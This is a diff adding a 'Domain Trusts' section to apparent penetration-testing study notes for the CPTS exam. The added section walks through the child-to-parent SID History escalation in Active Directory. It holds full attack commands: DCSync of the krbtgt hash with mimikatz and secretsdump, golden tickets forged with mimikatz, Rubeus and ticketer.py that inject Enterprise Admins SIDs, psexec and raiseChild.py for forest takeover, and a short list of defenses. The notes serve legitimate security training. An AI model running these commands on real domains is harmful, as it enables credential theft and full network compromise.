@@ -514,6 +514,50 @@ Get-ADComputer -Filter {msDS-AllowedToActOnBehalfOfOtherIdentity -ne "$null"}
 
 > RBCD is the modern go-to: BloodHound finds "you have write over this computer," and that single edge turns into SYSTEM on it via the RBCD → S4U chain.
 
+## Domain Trusts
+Trusts let users authenticate across domains/forests. Types: **parent-child** (same forest, transitive, two-way), cross-link, **external** (cross-forest, non-transitive, SID filtering on), tree-root, **forest** (forest-root to forest-root, transitive), ESAE (bastion). Direction: one-way (trusted users reach trusting domain) vs bidirectional.
+
+**Enumerate:**
+```powershell
+Get-ADTrust -Filter *            # built-in
+Get-DomainTrust ; Get-DomainTrustMapping    # PowerView
+netdom query /domain:<domain> trust
+```
+BloodHound: "Map Domain Trusts" query. Trusts are a prime **pivot** between domains.
+
+### Child → Parent escalation: ExtraSIDs / SID History
+Within a forest, **SID filtering is off between parent and child**, so a child-domain compromise → full forest. Forge a Golden Ticket that injects the parent's **Enterprise Admins** SID into `sidHistory`. Need: child **krbtgt hash**, child domain SID, a username (can be fake), child FQDN, parent Enterprise Admins SID.
+
+**Gather:**
+```text
+# krbtgt hash:  mimikatz lsadump::dcsync /user:<CHILD>\krbtgt   (or secretsdump -just-dc-user <CHILD>/krbtgt)
+# child SID:    Get-DomainSID   (or lookupsid.py ... | grep "Domain SID")
+# EA SID:       Get-DomainGroup -Domain <PARENT> -Identity "Enterprise Admins" | select objectsid
+```
+
+**From Windows (mimikatz / Rubeus):**
+```text
+mimikatz: kerberos::golden /user:hacker /domain:<CHILD> /sid:<CHILD_SID> /krbtgt:<HASH> /sids:<PARENT_EA_SID> /ptt
+# or: Rubeus.exe golden /rc4:<HASH> /domain:<CHILD> /sid:<CHILD_SID> /sids:<PARENT_EA_SID> /user:hacker /ptt
+klist ; dir \\<parent-dc>\c$          # verify → then DCSync the parent
+```
+
+**From Linux (Impacket):**
+```bash
+secretsdump.py <child>/<adm>@<child-dc> -just-dc-user <CHILD>/krbtgt
+lookupsid.py <child>/<adm>@<child-dc> | grep "Domain SID"
+lookupsid.py <child>/<adm>@<parent-dc> | grep -B12 "Enterprise Admins"
+ticketer.py -nthash <KRBTGT_HASH> -domain <CHILD> -domain-sid <CHILD_SID> -extra-sid <PARENT_EA_SID> hacker
+export KRB5CCNAME=hacker.ccache
+psexec.py <CHILD>/hacker@<parent-dc> -k -no-pass -target-ip <parent-dc-ip>
+# or fully automated:
+raiseChild.py -target-exec <parent-dc-ip> <CHILD>/<adm>
+```
+
+**Defense:** enable SID filtering / quarantine (`netdom trust ... /quarantine:yes`), monitor sidHistory changes (Event IDs 4765/4766), minimize EA/DA membership, tiered admin model, audit trusts.
+
+> Key idea: in a single forest, owning a **child** domain = owning the **whole forest**, because SID filtering isn't enforced internally. `raiseChild.py` automates it, but know the manual steps for the exam and for when autopwn is too risky on a client.
+
 ## AD attack catalog (by phase — study/coverage index)
 The full menu. Commands for the core ones are in the attack-flow above; this is the map so I know what exists and when it applies. **CPTS focus = the post-access AD attacks** (credential dumping → privesc → lateral → persistence). Initial-access social/physical and Azure/cloud items are mostly red-team / cloud scope — know the names, but they're outside core CPTS.
 
